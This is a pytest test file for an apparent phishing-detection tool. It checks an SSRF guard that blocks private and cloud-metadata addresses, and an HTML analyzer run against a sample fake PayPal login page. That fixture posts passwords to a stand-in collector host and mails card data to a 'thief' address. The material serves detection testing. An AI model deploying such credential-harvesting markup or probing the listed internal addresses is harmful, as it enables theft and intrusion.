"""SSRF guard, page analysis and host helpers, all without real network."""
import pytest

from phishguard.features import host as host_mod
from phishguard.features.netguard import BlockedAddress, is_public_ip, resolve_public
from phishguard.features.page import analyze_html, fetch_page
from phishguard.features.parsing import parse_url


@pytest.mark.parametrize("ip,public", [
    ("8.8.8.8", True),
    ("127.0.0.1", False),
    ("10.1.2.3", False),
    ("192.168.1.10", False),
    ("169.254.169.254", False),   # cloud metadata endpoint
    ("100.64.0.1", False),        # carrier-grade NAT
    ("0.0.0.0", False),
    ("::1", False),
    ("::ffff:127.0.0.1", False),  # IPv4-mapped loopback
    ("fe80::1%3", False),         # link-local with zone id
    ("2606:4700:4700::1111", True),
])
def test_is_public_ip(ip, public):
    assert is_public_ip(ip) is public


def test_resolve_public_blocks_if_any_address_is_private(fake_dns):
    fake_dns["mixed.example"] = ["93.184.216.34", "127.0.0.1"]
    fake_dns["ok.example"] = ["93.184.216.34"]
    with pytest.raises(BlockedAddress):
        resolve_public("mixed.example")
    with pytest.raises(BlockedAddress):
        resolve_public("missing.example")
    assert resolve_public("ok.example") == ["93.184.216.34"]


def test_fetch_page_refuses_internal_targets(fake_dns):
    fake_dns["intranet.example"] = ["10.0.0.5"]
    result = fetch_page("http://intranet.example/admin")
    assert result.error.startswith("blocked") and result.html == ""


def test_gather_host_intel_skips_private_hosts(fake_dns):
    fake_dns["router.example"] = ["192.168.0.1"]
    intel = host_mod.gather_host_intel(parse_url("http://router.example/"))
    assert intel["blocked"] and intel["tls"] is None


def test_tls_check_never_connects_to_private_ip():
    out = host_mod.tls_certificate("example.com", "127.0.0.1")
    assert out["error"].startswith("blocked")


PHISH_HTML = """
<html><head><title>PayPal - Log In</title></head><body>
  <form action="https://collector.evil-host.example/gate.php" method="post">
    <input name="email"><input type="password" name="pw">
  </form>
  <form action="mailto:thief@example.net"><input name="card"></form>
  <iframe src="https://x.example"></iframe>
</body></html>
"""


def test_analyze_html_finds_credential_theft_signals():
    out = analyze_html(PHISH_HTML, "http://paypal-help.example.org/login")
    assert out["title"] == "PayPal - Log In"
    assert out["password_fields"] == 1
    assert out["external_password_form"] is True
    assert out["mailto_form"] is True
    assert out["brands_in_title"] == ["paypal"]
    assert out["iframe_count"] == 1


def test_analyze_html_same_site_login_is_not_external():
    html = '<title>Sign in</title><form action="/session" method="post"><input type="password"></form>'
    out = analyze_html(html, "https://shop.example.com/login")
    assert out["external_form_count"] == 0 and out["password_fields"] == 1
    assert out["forms"][0]["kind"] == "same-site"


def test_brand_on_its_own_site_is_not_impersonation():
    out = analyze_html("<title>PayPal - Log In</title>", "https://www.paypal.com/signin")
    assert out["brands_in_title"] == []


def test_meta_refresh_target_is_resolved():
    out = analyze_html('<meta http-equiv="refresh" content="0; url=https://other.example/x">', "https://a.example/")
    assert out["meta_refresh_to"] == "https://other.example/x"


def test_domain_age_prefers_rdap_and_falls_back(monkeypatch):
    from datetime import datetime, timedelta, timezone
    created = datetime.now(timezone.utc) - timedelta(days=12)
    monkeypatch.setattr(host_mod, "_rdap", lambda d, t: None)  # registry has no RDAP
    monkeypatch.setattr(host_mod, "_whois", lambda d, t: {"created": created, "registrar": "R", "source": "whois"})
    out = host_mod.domain_age("new-site.example")
    assert out["age_days"] == 12 and out["source"] == "whois"


def test_domain_age_errors_are_not_fatal(monkeypatch):
    def boom(d, t):
        raise TimeoutError
    monkeypatch.setattr(host_mod, "_rdap", boom)
    monkeypatch.setattr(host_mod, "_whois", boom)
    out = host_mod.domain_age("x.example")
    assert out["age_days"] is None and "TimeoutError" in out["error"]
